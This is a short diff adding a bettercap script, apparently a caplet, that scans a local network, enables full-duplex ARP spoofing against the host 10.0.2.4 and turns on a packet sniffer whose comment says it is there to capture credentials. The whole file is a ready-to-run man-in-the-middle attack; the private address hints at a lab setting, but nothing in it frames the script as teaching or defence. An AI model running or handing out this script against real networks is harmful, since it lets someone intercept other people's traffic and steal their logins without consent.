@@ -1,0 +1,20 @@
+#Scan the network to discover active devices
+net.probe on
+
+#Wait 5 seconds to ensure the network is scanned enough
+sleep 5
+
+#Show scanned network devices
+net.show
+
+#Turn on fullduplex
+set arp.spoof.fullduplex true
+
+#Set the target machine's IP address
+set arp.spoof.targets 10.0.2.4
+
+#Start the ARP spoofing attack
+arp.spoof on
+
+#Start the network sniffer to capture credentials and packet data
+net.sniff on
